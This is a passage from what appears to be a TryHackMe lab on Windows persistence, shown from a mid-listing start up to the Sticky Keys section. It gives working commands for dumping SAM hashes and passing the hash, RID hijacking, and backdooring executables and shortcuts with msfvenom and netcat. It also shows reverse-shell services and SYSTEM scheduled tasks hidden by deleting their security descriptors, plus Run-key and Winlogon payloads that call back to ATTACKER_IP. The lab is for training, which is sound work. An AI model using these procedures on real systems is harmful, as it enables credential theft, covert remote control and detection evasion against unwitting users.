BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288

```

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:

AttackBox

```
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

**Note:** If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools:

AttackBox

```
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCALImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...
```

And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:

AttackBox

```
user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Using the Administrator console gained through the thmuser1, execute

```
C:\flags\flag1.exe
```

to retrieve your flag.

# Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can 
be achieved without modifying any group membership. Special groups are 
only special because the operating system assigns them specific 
privileges by default. **Privileges** are simply the 
capacity to do a task on the system itself. They include simple things 
like having the capabilities to shut down the server up to very 
privileged operations like being able to take ownership of any file on 
the system. A complete list of available privileges can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:

- **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
- **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:

```powershell
secedit /export /cfg config.inf
```

We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/765671a0355e2260c44e5a12a10f090e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/765671a0355e2260c44e5a12a10f090e.png)

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:

```powershell
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup 
Operator. The user still can't log into the system via WinRM, so let's 
do something about it. Instead of adding the user to the Remote 
Management Users group, we'll change the security descriptor associated 
with the WinRM service to allow thmuser2 to connect. Think of a **security descriptor** as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security 
descriptor, you can use the following command in Powershell (you'll need
 to use the GUI session for this):

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/380c80b98c4d1f8c2149ef72427cfeb0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/380c80b98c4d1f8c2149ef72427cfeb0.png)

Once we have done this, our user can connect via WinRM. Since the 
user has the SeBackup and SeRestore privileges, we can repeat the steps 
to recover the password hashes from the SAM and connect back with the 
Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy** registry key, but we've done this already to get the previous flag.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!

Command Prompt

```
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None

```

Once again, we'll assume we have already dumped the credentials on 
the server and have thmuser2's password. Let's connect with its 
credentials using WinRM:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

| **Username** | thmuser2 |
| --- | --- |
| **Password** | Password321 |

We can log in with those credentials to obtain the flag.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Log in to the machine via WinRM using thmuser2 and execute

```
C:\flags\flag2.exe
```

to retrieve your flag.

# RID Hijacking

Another method to gain administrative privileges without being an 
administrator is changing some registry values to make the operating 
system think you are the Administrator.

When a user is created, an identifier called **Relative ID (RID)** is
 assigned to them. The RID is simply a numeric identifier representing 
the user across the system. When a user logs on, the LSASS process gets 
its RID from the SAM registry hive and creates an access token 
associated with that RID. If we can tamper with the registry value, we 
can make windows assign an Administrator access token to an unprivileged
 user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the **RID = 500**, and regular users usually have **RID >= 1000**.

To find the assigned RIDs for any user, you can use the following command:

Command Prompt

```
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

The RID is the last bit of the SID (1010 for thmuser3 and 500 for 
Administrator). The SID is an identifier that allows the operating 
system to identify a user across a domain, but we won't mind too much 
about the rest of it for this task.

Now we only have to assign the RID=500 to thmuser3. To do so, we need
 to access the SAM using Regedit. The SAM is restricted to the SYSTEM 
account only, so even the Administrator won't be able to edit it. To run
 Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in your machine:

Command Prompt

```
C:\tools\pstools> PsExec64.exe -i -s regedit
```

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\`
 where there will be a key for each user in the machine. Since we want 
to modify thmuser3, we need to search for a key with its RID in hex 
(1010 = 0x3F2). Under the corresponding key, there will be a value 
called **F**, which holds the user's effective RID at position 0x30:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d630140974989748ebcf150ba0696d14.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d630140974989748ebcf150ba0696d14.png)

Notice the RID is stored using little-endian notation, so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f2072b6d13b7343cf7b890586703ddf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f2072b6d13b7343cf7b890586703ddf.png)

The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

For this task, we assume you have already compromised the 
system and obtained the password for thmuser3. For your convenience, the
 user can connect via RDP with the following credentials:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

| **Username** | thmuser3 |
| --- | --- |
| **Password** | Password321 |

If you did everything correctly, you should be logged in to the Administrator's desktop.

**Backdooring Files**

Another method of 
establishing persistence consists of tampering with some files we know 
the user interacts with regularly. By performing some modifications to 
such files, we can plant backdoors that will get executed whenever the 
user accesses them. Since we don't want to create any alerts that could 
blow our cover, the files we alter must keep working for the user as 
expected.

While there are many opportunities to plant backdoors, we will check the most commonly used ones.

# Executable Files

If you find any executable laying around the desktop, the chances are
 high that the user might use it frequently. Suppose we find a shortcut 
to PuTTY lying around. If we checked the shortcut's properties, we could
 see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

You can easily plant a payload of your preference in any .exe file with `msfvenom`.
 The binary will still work as usual but execute an additional payload 
silently by adding an extra thread in your binary. To create a 
backdoored putty.exe, we can use the following command:

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter 
payload without the user noticing it. While this method is good enough 
to establish persistence, let's look at other sneakier techniques.

# Shortcut Files

If we don't want to alter the executable, we can always tamper with 
the shortcut file itself. Instead of pointing directly to the expected 
executable, we can change it to point to a script that will run a 
backdoor and then execute the usual program normally.

For this task, let's check the shortcut to **calc** on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a7349b9dcc5af3180044ee1d7605967.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a7349b9dcc5af3180044ee1d7605967.png)

Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32`
 or any other sneaky location. The script will execute a reverse shell 
and then run calc.exe from the original location on the shortcut's 
properties:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe

```

Finally, we'll change the shortcut to point to our script. Notice 
that the shortcut's icon might be automatically adjusted while doing so.
 Be sure to point the icon back to the original executable so that no 
visible changes appear to the user. We also want to run our script on a 
hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:

```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fe703ddea6135e0c867afcc6f61a8cd2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fe703ddea6135e0c867afcc6f61a8cd2.png)

Let's start an nc listener to receive our reverse shell on our attacker's machine:

AttackBox

```
user@AttackBox$ nc -lvp 4445
```

If you double-click the shortcut, you should get a connection back to
 your attacker's machine. Meanwhile, the user will get a calculator just
 as expected by them. You will probably notice a command prompt flashing
 up and disappearing immediately on your screen. A regular user might 
not mind too much about that, hopefully.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Execute

```
C:\flags\flag5.exe
```

from your reverse shell to get your flag!

# Hijacking File Associations

In addition to persisting through executables or shortcuts, we can 
hijack any file association to force the operating system to run a shell
 whenever the user opens a specific file type.

The default operating system file associations are kept inside the 
registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. Let's say we want to check which program is used to open .txt files; we can just go and check for the `.txt` subkey and find which **Programmatic ID (ProgID)** is
 associated with it. A ProgID is simply an identifier to a program 
installed on the system. For .txt files, we will have the following 
ProgID:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3ae1b8356b38a349090e836026d6d480.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3ae1b8356b38a349090e836026d6d480.png)

We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c3565cf93de4990f41f41b25aed80571.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c3565cf93de4990f41f41b25aed80571.png)

In this case, when you try to open a .txt file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1`
 represents the name of the opened file. If we want to hijack this 
extension, we could replace the command with a script that executes a 
backdoor and then opens the file as usual. First, let's create a ps1 
script with the following content and save it to `C:\Windows\backdoor2.ps1`:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`.

Now let's change the registry key to run our backdoor script in a hidden window:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f7ed25a701cf20ea85cf333b20708ffe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f7ed25a701cf20ea85cf333b20708ffe.png)

Finally, create a listener for your reverse shell and try to open any
 .txt file on the victim machine (create one if needed). You should 
receive a reverse shell with the privileges of the user opening the 
file.

**Abusing Services**

Windows services offer a
 great way to establish persistence since they can be configured to run 
in the background whenever the victim machine is started. If we can 
leverage any service to run something for us, we can regain control of 
the victim machine each time it is started.

A service is basically an executable that runs in the background. 
When configuring a service, you define which executable will be used and
 select if the service will automatically run when the machine starts or
 should be manually started.

There are two main ways we can abuse services to establish 
persistence: either create a new service or modify an existing one to 
execute our payload.

# Creating backdoor services

We can create and start a service named "THMservice" using the following commands:

```
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

**Note:** There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create
 a reverse shell with msfvenom and associate it with the created 
service. Notice, however, that service executables are unique since they
 need to implement a particular protocol to be handled by the system. If
 you want to create an executable that is compatible with Windows 
services, you can use the `exe-service` format in msfvenom:

AttackBox

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

You can then copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it:

```
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

This should create a connection back to your attacker's machine.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)

Use the reverse shell you just gained to execute

```
C:\flags\flag7.exe
```

# Modifying existing services

While creating new services for persistence works quite well, the 
blue team may monitor new service creation across the network. We may 
want to reuse an existing service instead of creating one to avoid 
detection. Usually, any disabled service will be a good candidate, as it
 could be altered without the user noticing it.

You can get a list of available services using the following command:

Command Prompt

```
C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

You should be able to find a stopped service called THMService3. To 
query the service's configuration, you can use the following command:

Command Prompt

```
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       :
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

There are three things we care about when using a service for persistence:

- The executable (**BINARY_PATH_NAME**) should point to our payload.
- The service **START_TYPE** should be automatic so that the payload runs without user interaction.
- The **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.

Let's start by creating a new reverse shell with msfvenom:

AttackBox

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

To reconfigure "THMservice3" parameters, we can use the following command:

Command Prompt

```
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

You can then query the service's configuration again to check if all went as expected:

Command Prompt

```
C:\> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

**Abusing Scheduled Tasks**

We can also use 
scheduled tasks to establish persistence if needed. There are several 
ways to schedule the execution of a payload in Windows systems. Let's 
look at some of them:

# Task Scheduler

The most common way to schedule tasks is using the built-in **Windows task scheduler**.
 The task scheduler allows for granular control of when your task will 
start, allowing you to configure tasks that will activate at specific 
hours, repeat periodically or even trigger when specific system events 
occur. From the command line, you can use `schtasks` to interact with the task scheduler. A complete reference for the command can be found on [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

Let's create a task that runs a reverse shell every single minute. In
 a real-world scenario, you wouldn't want your payload to run so often, 
but we don't want to wait too long for this room:

Command Prompt

```
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

**Note:** Be sure to use `THM-TaskBackdoor` as the name of your task, or you won't get the flag.

The previous command will create a "THM-TaskBackdoor" task and execute an `nc64` reverse shell back to the attacker. The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates that the task will run with SYSTEM privileges.

To check if our task was successfully created, we can use the following command:

Command Prompt

```
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

# Making Our Task Invisible

Our task should be up and running by now, but if the compromised user
 tries to list its scheduled tasks, our backdoor will be noticeable. To 
further hide our scheduled task, we can make it invisible to any user in
 the system by deleting its **Security Descriptor (SD)**. The security descriptor is simply an ACL
 that states which users have access to the scheduled task. If your user
 isn't allowed to query a scheduled task, you won't be able to see it 
anymore, as Windows only shows you the tasks that you have permission to
 use. Deleting the SD is equivalent to disallowing all users' access to 
the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`.
 You will find a registry key for every task, under which a value named 
"SD" contains the security descriptor. You can only erase the value if 
you hold SYSTEM privileges.

To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:

Command Prompt

```
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

We will then delete the security descriptor for our task:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6dad473b19be313e3069da0a2fc937.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6dad473b19be313e3069da0a2fc937.png)

If we try to query our service again, the system will tell us there is no such task:

Command Prompt

```
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```

If we start an nc listener in our attacker's machine, we should get a shell back after a minute:

AttackBox

```
user@AttackBox$ nc -lvp 4449
```

**Logon Triggered Persistence**

Some actions performed 
by a user might also be bound to executing specific payloads for 
persistence. Windows operating systems present several ways to link 
payloads with particular interactions. This task will look at ways to 
plant payloads that will get executed when a user logs into the system.

# Startup folder

Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
 where you can put executables to be run whenever the user logs in. An 
attacker can achieve persistence just by dropping a payload in there. 
Notice that each user will only run whatever is available in their 
folder.

If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

For this task, let's generate a reverse shell payload using msfvenom:

AttackBox

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

We will then copy our payload into the victim machine. You can spawn an `http.server` with Python3 and use wget on the victim machine to pull your file:

| AttackBox
        

`user@AttackBox$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...` | **➜** | Powershell
        

`PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe` |
| --- | --- | --- |

We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.

Command Prompt

```
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f0ba7fd44646d55c5505737642bdd96e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f0ba7fd44646d55c5505737642bdd96e.png)

And log back via RDP. You should immediately receive a connection back to your attacker's machine.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Use your newly obtained shell to execute

```
C:\flags\flag10.exe
```

and get your flag!

# Run / RunOnce

You can also force a user to execute a program on logon via the 
registry. Instead of delivering your payload into a specific directory, 
you can use the following registry entries to specify applications to 
run at logon:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.

For this task, let's create a new reverse shell with msfvenom:

AttackBox

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

After transferring it to the victim machine, let's move it to `C:\Windows\`:

Command Prompt

```
C:\> move revshell.exe C:\Windows
```

Let's then create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name can be anything you like, and the value will be the command we want to execute.

**Note:** While in a real-world set-up you could use any name for your registry entry, for this task you are required to use `MyBackdoor` to receive the flag.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c99038cd6cc9e37512edabb1f873a4da.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c99038cd6cc9e37512edabb1f873a4da.png)

After doing this, sign out of your current session and log in again, 
and you should receive a shell (it will probably take around 10-20 
seconds).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Using your newly obtained shell, execute

```
C:\flags\flag11.exe
```

to get a flag!

# Winlogon

Another alternative to automatically start programs on logon is 
abusing Winlogon, the Windows component that loads your user profile 
right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

- `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
- `shell` points to the system's shell, which is usually `explorer.exe`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f3c2215af6e3f2d19313498fca62a9d4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f3c2215af6e3f2d19313498fca62a9d4.png)

If we'd replace any of the executables with some reverse shell, we 
would break the logon sequence, which isn't desired. Interestingly, you 
can append commands separated by a comma, and Winlogon will process them
 all.

Let's start by creating a shell:

AttackBox

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. 
We can then copy the shell to any directory we like. In this case, we 
will use `C:\Windows`:

Command Prompt

```
C:\> move revshell.exe C:\Windows
```

We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.

**Note:** While both `shell` and `Userinit` could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use `Userinit`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dc5fa3e75ff056f11e16c03373799f45.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dc5fa3e75ff056f11e16c03373799f45.png)

After doing this, sign out of your current session and log in again, 
and you should receive a shell (it will probably take around 10 
seconds).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Using your newly obtained shell, execute

```
C:\flags\flag12.exe
```

to get a flag!

# Logon scripts

One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`.
 We can use this environment variable to assign a logon script to a user
 that will get run when logging into the machine. The variable isn't set
 by default, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:

AttackBox

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. 
We can then copy the shell to any directory we like. In this case, we 
will use `C:\Windows`:

Command Prompt

```
C:\> move revshell.exe C:\Windows
```

To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ce41ee1fc282b8dcacd757b23417b12.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ce41ee1fc282b8dcacd757b23417b12.png)

Notice that this registry key has no equivalent in `HKLM`, making your backdoor apply to the current user only.

**Backdooring the Login Screen / RDP**

If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.

We will look at two methods that rely on accessibility features to this end.

# Sticky Keys

When pressing key combinations like `CTRL + ALT + DEL`, 
you can configure Windows to use sticky keys, which allows you to press 
the buttons of a combination sequentially instead of at the same time. 
In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.

To establish persistence using Sticky Keys, we will abuse a shortcut 
enabled by default in any Windows installation that allows us to 
activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:

